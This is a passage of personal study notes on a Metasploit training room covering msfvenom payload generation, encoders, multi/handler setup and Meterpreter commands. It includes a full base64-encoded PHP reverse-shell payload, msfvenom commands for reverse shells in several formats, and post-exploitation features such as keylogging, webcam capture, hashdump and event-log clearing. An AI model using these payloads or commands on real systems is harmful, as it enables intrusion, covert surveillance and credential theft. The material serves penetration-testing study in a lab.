</span></span><span class=line><span class=cl>    apple_ios/armle/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload (stageless)
</span></span><span class=line><span class=cl>        
</span></span></code></pre></td></tr></table></div></div><a href=#output-formats><h3 id=output-formats><span class=hanchor arialabel=Anchor># </span>Output formats</h3></a><p>You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). The<code>msfvenom --list formats</code> command can be used to list supported output formats</p><a href=#encoders><h3 id=encoders><span class=hanchor arialabel=Anchor># </span>Encoders</h3></a><p>Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the <code>-e</code> parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was <code>raw</code>.</p><p>Generating a PHP payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>           root@ip-10-10-186-44:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
</span></span><span class=line><span class=cl>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
</span></span><span class=line><span class=cl>[-] No arch selected, selecting arch: php from the payload
</span></span><span class=line><span class=cl>Found 1 compatible encoders
</span></span><span class=line><span class=cl>Attempting to encode payload with 1 iterations of php/base64
</span></span><span class=line><span class=cl>php/base64 succeeded with size 1507 (iteration=0)
</span></span><span class=line><span class=cl>php/base64 chosen with final size 1507
</span></span><span class=line><span class=cl>Payload size: 1507 bytes
</span></span><span class=line><span class=cl>eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjEwLjE4Ni40NCc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygi.TmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7));
</span></span><span class=line><span class=cl>root@ip-10-10-186-44:~#
</span></span><span class=line><span class=cl>        
</span></span></code></pre></td></tr></table></div></div><a href=#handlers><h3 id=handlers><span class=hanchor arialabel=Anchor># </span>Handlers</h3></a><p>Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload. When using an exploit module, this part is automatically handled by the exploit module, you will remember how the <code>payload options</code> title appeared when setting a reverse shell. The term commonly used to receive a connection from a target is &lsquo;catching a shell&rsquo;. Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.</p><p>The following scenario may be familiar; we will exploit the file upload vulnerability present in DVWA (Damn Vulnerable Web Application). For the exercises in this task, you will need to replicate a similar scenario on another target system, DVWA was used here for illustration purposes. The exploit steps are;</p><ol><li>Generate the PHP shell using MSFvenom</li><li>Start the Metasploit handler</li><li>Execute the PHP shell</li></ol><p>MSFvenom will require a payload, the local machine IP address, and the local port to which the payload will connect. Seen below, 10.0.2.19 is the IP address of a Kali Linux machine used in the attack and local port 7777 was chosen.</p><p>Generating a PHP reverse shell</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>           root@ip-10-0-2-19:~# msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw &gt; reverse_shell.php
</span></span><span class=line><span class=cl>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
</span></span><span class=line><span class=cl>[-] No arch selected, selecting arch: php from the payload
</span></span><span class=line><span class=cl>No encoder specified, outputting raw payload
</span></span><span class=line><span class=cl>Payload size: 3020 bytes
</span></span><span class=line><span class=cl>root@ip-10-0-2-19:~#
</span></span><span class=line><span class=cl>        
</span></span></code></pre></td></tr></table></div></div><p>Please note: The output PHP file will miss the starting PHP tag commented and the end tag (<code>?></code>), as seen below.</p><p><img src=https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/d82319bb6e03f8fbd8d005da9c31e59d.png width=auto alt></p><p>The reverse_shell.php file should be edited to convert it into a working PHP file.</p><p>Below: Comments removed from the beginning of the file.</p><p><img src=https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/49c2132c9bd568cc3201bb38ed4ff7a0.png width=auto alt></p><p>Below: End tag added</p><p><img src=https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/ae579463375c5847a0b99d46f93c4142.png width=auto alt></p><p>We will use Multi Handler to receive the incoming connection. The module can be used with the <code>use exploit/multi/handler</code> command.</p><p>Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.</p><p>To use the module, we will need to set the payload value (<code>php/reverse_php</code> in this case), the LHOST, and LPORT values.</p><p>Setting up the listener:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>           msf6 &gt; use exploit/multi/handler 
</span></span><span class=line><span class=cl>[*] Using configured payload generic/shell_reverse_tcp
</span></span><span class=line><span class=cl>msf5 exploit(multi/handler) &gt; set payload php/reverse_php
</span></span><span class=line><span class=cl>payload =&gt; php/reverse_php
</span></span><span class=line><span class=cl>msf5 exploit(multi/handler) &gt; set lhost 10.0.2.19
</span></span><span class=line><span class=cl>lhost =&gt; 10.0.2.19
</span></span><span class=line><span class=cl>msf6 exploit(multi/handler) &gt; set lport 7777
</span></span><span class=line><span class=cl>lport =&gt; 7777
</span></span><span class=line><span class=cl>msf6 exploit(multi/handler) &gt; show options
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Module options (exploit/multi/handler):
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name  Current Setting  Required  Description
</span></span><span class=line><span class=cl>   ----  ---------------  --------  -----------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Payload options (php/reverse_php):
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name   Current Setting  Required  Description
</span></span><span class=line><span class=cl>   ----   ---------------  --------  -----------
</span></span><span class=line><span class=cl>   LHOST  10.0.2.19        yes       The listen address (an interface may be specified)
</span></span><span class=line><span class=cl>   LPORT  7777             yes       The listen port
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Exploit target:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Id  Name
</span></span><span class=line><span class=cl>   --  ----
</span></span><span class=line><span class=cl>   0   Wildcard Target
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>msf6 exploit(multi/handler) &gt;
</span></span><span class=line><span class=cl>        
</span></span></code></pre></td></tr></table></div></div><p>Once everything is set, we will <code>run</code> the handler and wait for the incoming connection.</p><p>Waiting for the reverse shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>           msf6 exploit(multi/handler) &gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[*] Started reverse TCP handler on 10.10.186.44:7777
</span></span><span class=line><span class=cl>        
</span></span></code></pre></td></tr></table></div></div><p>When the reverse shell is triggered, the connection will be received by multi/handler and provide us with a shell.</p><p>If the payload was set as Meterpreter (e.g. in a Windows executable format), multi/handler would then provide us with a Meterpreter shell.</p><a href=#other-payloads><h3 id=other-payloads><span class=hanchor arialabel=Anchor># </span>Other Payloads</h3></a><p>Based on the target system&rsquo;s configuration (operating system, install webserver, installed interpreter, etc.), msfvenom can be used to create payloads in almost all formats. Below are a few examples you will often use:</p><p>In all these examples, LHOST will be the IP address of your attacking machine, and LPORT will be the port on which your handler will listen.</p><p>Linux Executable and Linkable Format (elf)<br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf</code><br>The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.</p><p>Windows<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe</code></p><p>PHP<br><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php</code></p><p>ASP<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp</code></p><p>Python<br><code>msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py</code></p><p>All of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler. You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same you have used when creating the msfvenom payload.</p><a href=#meterpreter><h2 id=meterpreter><span class=hanchor arialabel=Anchor># </span>Meterpreter</h2></a><p>Meterpreter is a Metasploit payload that supports the penetration testing process with many valuable components. Meterpreter will run on the target system and act as an agent within a command and control architecture. You will interact with the target operating system and files and use Meterpreter&rsquo;s specialized commands.</p><p>Meterpreter has many versions which will provide different functionalities based on the target system.</p><p><strong>How does Meterpreter work?</strong></p><p>Meterpreter runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target. This feature aims to avoid being detected during antivirus scans. By default, most antivirus software will scan new files on the disk (e.g. when you download a file from the internet) Meterpreter runs in memory (RAM - Random Access Memory) to avoid having a file that has to be written to the disk on the target system (e.g. meterpreter.exe). This way, Meterpreter will be seen as a process and not have a file on the target system.</p><p>Meterpreter also aims to avoid being detected by network-based IPS (Intrusion Prevention System) and IDS (Intrusion Detection System) solutions by using encrypted communication with the server where Metasploit runs (typically your attacking machine). If the target organization does not decrypt and inspect encrypted traffic (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions will not be able to detect its activities.</p><p>While Meterpreter is recognized by major antivirus software, this feature provides some degree of stealth.</p><p>The example below shows a target Windows machine exploited using the MS17-010 vulnerability. You will see Meterpreter is running with a process ID (PID) of 1304; this PID will be different in your case. We have used the <code>getpid</code> command, which returns the process ID with which Meterpreter is running. The process ID (or process identifier) is used by operating systems to identify running processes. All processes running in Linux or Windows will have a unique ID number; this number is used to interact with the process when the need arises (e.g. if it needs to be stopped).</p><p>Getpid</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>           meterpreter &gt; getpid 
</span></span><span class=line><span class=cl>Current pid: 1304
</span></span><span class=line><span class=cl>        
</span></span></code></pre></td></tr></table></div></div><p>If we list processes running on the target system using the <code>ps</code> command, we see PID 1304 is spoolsv.exe and not Meterpreter.exe, as one might expect.</p><p>The ps command</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>           meterpreter &gt; ps
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Process List
</span></span><span class=line><span class=cl><mark>=</mark><mark>=</mark>==
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> PID   PPID  Name                  Arch  Session  User                          Path
</span></span><span class=line><span class=cl> ---   ----  ----                  ----  -------  ----                          ----
</span></span><span class=line><span class=cl> 0     0     [System Process]                                                   
</span></span><span class=line><span class=cl> 4     0     System                x64   0                                      
</span></span><span class=line><span class=cl> 396   644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
</span></span><span class=line><span class=cl> 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
</span></span><span class=line><span class=cl> 428   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
</span></span><span class=line><span class=cl> 548   540   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
</span></span><span class=line><span class=cl> 596   540   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
</span></span><span class=line><span class=cl> 604   588   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
</span></span><span class=line><span class=cl> 644   588   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
</span></span><span class=line><span class=cl> 692   596   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
</span></span><span class=line><span class=cl> 700   692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  
</span></span><span class=line><span class=cl> 716   596   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe  1276  1304  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
</span></span><span class=line><span class=cl> 1304  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
</span></span><span class=line><span class=cl> 1340  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
</span></span><span class=line><span class=cl> 1388  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
</span></span><span class=line><span class=cl>        
</span></span></code></pre></td></tr></table></div></div><p>Even if we were to go a step further and look at DLLs (Dynamic-Link Libraries) used by the Meterpreter process (PID 1304 in this case), we still would not find anything jumping at us (e.g. no meterpreter.dll)</p><p>The Meterpreter process</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>           C:\Windows\system32&gt;tasklist /m /fi &#34;pid eq 1304&#34;
</span></span><span class=line><span class=cl>tasklist /m /fi &#34;pid eq 1304&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Image Name                     PID Modules                                     
</span></span><span class=line><span class=cl><mark>=</mark><mark>=</mark><mark>=</mark><mark>=</mark><mark>=</mark> <mark>=</mark>=== <mark>=</mark><mark>=</mark><mark>=</mark><mark>=</mark><mark>=</mark><mark>=</mark><mark>=</mark><mark>=</mark>====
</span></span><span class=line><span class=cl>spoolsv.exe                   1304 ntdll.dll, kernel32.dll, KERNELBASE.dll,    
</span></span><span class=line><span class=cl>                                   msvcrt.dll, sechost.dll, RPCRT4.dll,        
</span></span><span class=line><span class=cl>                                   USER32.dll, GDI32.dll, LPK.dll, USP10.dll,  
</span></span><span class=line><span class=cl>                                   POWRPROF.dll, SETUPAPI.dll, CFGMGR32.dll,   
</span></span><span class=line><span class=cl>                                   ADVAPI32.dll, OLEAUT32.dll, ole32.dll,      
</span></span><span class=line><span class=cl>                                   DEVOBJ.dll, DNSAPI.dll, WS2_32.dll,         
</span></span><span class=line><span class=cl>                                   NSI.dll, IMM32.DLL, MSCTF.dll,              
</span></span><span class=line><span class=cl>                                   CRYPTBASE.dll, slc.dll, RpcRtRemote.dll,    
</span></span><span class=line><span class=cl>                                   secur32.dll, SSPICLI.DLL, credssp.dll,      
</span></span><span class=line><span class=cl>                                   IPHLPAPI.DLL, WINNSI.DLL, mswsock.dll,      
</span></span><span class=line><span class=cl>                                   wshtcpip.dll, wship6.dll, rasadhlp.dll,     
</span></span><span class=line><span class=cl>                                   fwpuclnt.dll, CLBCatQ.DLL, umb.dll,         
</span></span><span class=line><span class=cl>                                   ATL.DLL, WINTRUST.dll, CRYPT32.dll,         
</span></span><span class=line><span class=cl>                                   MSASN1.dll, localspl.dll, SPOOLSS.DLL,      
</span></span><span class=line><span class=cl>                                   srvcli.dll, winspool.drv,                   
</span></span><span class=line><span class=cl>                                   PrintIsolationProxy.dll, FXSMON.DLL,        
</span></span><span class=line><span class=cl>                                   tcpmon.dll, snmpapi.dll, wsnmp32.dll,       
</span></span><span class=line><span class=cl>                                   msxml6.dll, SHLWAPI.dll, usbmon.dll,        
</span></span><span class=line><span class=cl>                                   wls0wndh.dll, WSDMon.dll, wsdapi.dll,       
</span></span><span class=line><span class=cl>                                   webservices.dll, FirewallAPI.dll,           
</span></span><span class=line><span class=cl>                                   VERSION.dll, FunDisc.dll, fdPnp.dll,        
</span></span><span class=line><span class=cl>                                   winprint.dll, USERENV.dll, profapi.dll,     
</span></span><span class=line><span class=cl>                                   GPAPI.dll, dsrole.dll, win32spl.dll,        
</span></span><span class=line><span class=cl>                                   inetpp.dll, DEVRTL.dll, SPINF.dll,          
</span></span><span class=line><span class=cl>                                   CRYPTSP.dll, rsaenh.dll, WINSTA.dll,        
</span></span><span class=line><span class=cl>                                   cscapi.dll, netutils.dll, WININET.dll,      
</span></span><span class=line><span class=cl>                                   urlmon.dll, iertutil.dll, WINHTTP.dll,      
</span></span><span class=line><span class=cl>                                   webio.dll, SHELL32.dll, MPR.dll,            
</span></span><span class=line><span class=cl>                                   NETAPI32.dll, wkscli.dll, PSAPI.DLL,        
</span></span><span class=line><span class=cl>                                   WINMM.dll, dhcpcsvc6.DLL, dhcpcsvc.DLL,     
</span></span><span class=line><span class=cl>                                   apphelp.dll, NLAapi.dll, napinsp.dll,       
</span></span><span class=line><span class=cl>                                   pnrpnsp.dll, winrnr.dll                     
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:\Windows\system32&gt;
</span></span><span class=line><span class=cl>        
</span></span></code></pre></td></tr></table></div></div><p>Typing help on any Meterpreter session (shown by meterpreter> at the prompt) will list all available commands.</p><p>The Meterpreter help menu</p><p>meterpreter > help</p><a href=#core-commands><h1 id=core-commands><span class=hanchor arialabel=Anchor># </span>Core Commands</h1></a><pre><code>Command                   Description
-------                   -----------
?                         Help menu
background                Backgrounds the current session
bg                        Alias for background
bgkill                    Kills a background meterpreter script
bglist                    Lists running background scripts
bgrun                     Executes a meterpreter script as a background thread
channel                   Displays information or control active channels
close                     Closes a channel[...]
</code></pre><p>Every version of Meterpreter will have different command options, so running the help command is always a good idea. Commands are built-in tools available on Meterpreter. They will run on the target system without loading any additional script or executable files.</p><p>Meterpreter will provide you with three primary categories of tools;</p><pre><code>Built-in commands
Meterpreter tools
Meterpreter scripting
</code></pre><p>If you run the help command, you will see Meterpreter commands are listed under different categories.</p><pre><code>Core commands
File system commands
Networking commands
System commands
User interface commands
Webcam commands
Audio output commands
Elevate commands
Password database commands
Timestomp commands
</code></pre><p>Please note that the list above was taken from the output of the help command on the Windows version of Meterpreter (windows/x64/meterpreter/reverse_tcp). These will be different for other Meterpreter versions.</p><p>Meterpreter commands
Core commands will be helpful to navigate and interact with the target system. Below are some of the most commonly used. Remember to check all available commands running the help command once a Meterpreter session has started.</p><p>Core commands</p><pre><code>background: Backgrounds the current session
exit: Terminate the Meterpreter session
guid: Get the session GUID (Globally Unique Identifier)
help: Displays the help menu
info: Displays information about a Post module
irb: Opens an interactive Ruby shell on the current session
load: Loads one or more Meterpreter extensions
migrate: Allows you to migrate Meterpreter to another process
run: Executes a Meterpreter script or Post module
sessions: Quickly switch to another session
</code></pre><p>File system commands</p><pre><code>cd: Will change directory
ls: Will list files in the current directory (dir will also work)
pwd: Prints the current working directory
edit: will allow you to edit a file
cat: Will show the contents of a file to the screen
rm: Will delete the specified file
search: Will search for files
upload: Will upload a file or directory
download: Will download a file or directory
</code></pre><p>Networking commands</p><pre><code>arp: Displays the host ARP (Address Resolution Protocol) cache
ifconfig: Displays network interfaces available on the target system
netstat: Displays the network connections
portfwd: Forwards a local port to a remote service
route: Allows you to view and modify the routing table
</code></pre><p>System commands</p><pre><code>clearev: Clears the event logs
execute: Executes a command
getpid: Shows the current process identifier
getuid: Shows the user that Meterpreter is running as
kill: Terminates a process
pkill: Terminates processes by name
ps: Lists running processes
reboot: Reboots the remote computer
shell: Drops into a system command shell
shutdown: Shuts down the remote computer
sysinfo: Gets information about the remote system, such as OS
</code></pre><p>Others Commands (these will be listed under different menu categories in the help menu)</p><pre><code>idletime: Returns the number of seconds the remote user has been idle
keyscan_dump: Dumps the keystroke buffer
keyscan_start: Starts capturing keystrokes
keyscan_stop: Stops capturing keystrokes
screenshare: Allows you to watch the remote user's desktop in real time
screenshot: Grabs a screenshot of the interactive desktop
record_mic: Records audio from the default microphone for X seconds
webcam_chat: Starts a video chat
webcam_list: Lists webcams
webcam_snap: Takes a snapshot from the specified webcam
webcam_stream: Plays a video stream from the specified webcam
getsystem: Attempts to elevate your privilege to that of local system
hashdump: Dumps the contents of the SAM database
</code></pre><p>Although all these commands may seem available under the help menu, they may not all work. For example, the target system might not have a webcam, or it can be running on a virtual machine without a proper desktop environment.</p></article><hr><div class=page-end id=footer><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li><a href=/quartz/notes/general/knowledge-hub/ data-ctx="THM - Metasploit" data-src=/notes/general/knowledge-hub class=internal-link>Knowledge Hub</a></li></ul></div><div><script src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://pietraferreira.github.io/quartz/js/graph.abd4bc2af3869a96524d7d23b76152c7.js></script></div></div><div id=contact_buttons><footer><p>Made by Morioh using <a href=https://github.com/jackyzha0/quartz>Quartz</a>, ¬© 2022</p><ul><li><a href=https://pietraferreira.github.io/quartz/>Home</a></li><li><a href=https://github.com/pietraferreira>Github</a></li></ul></footer></div></div></body></html>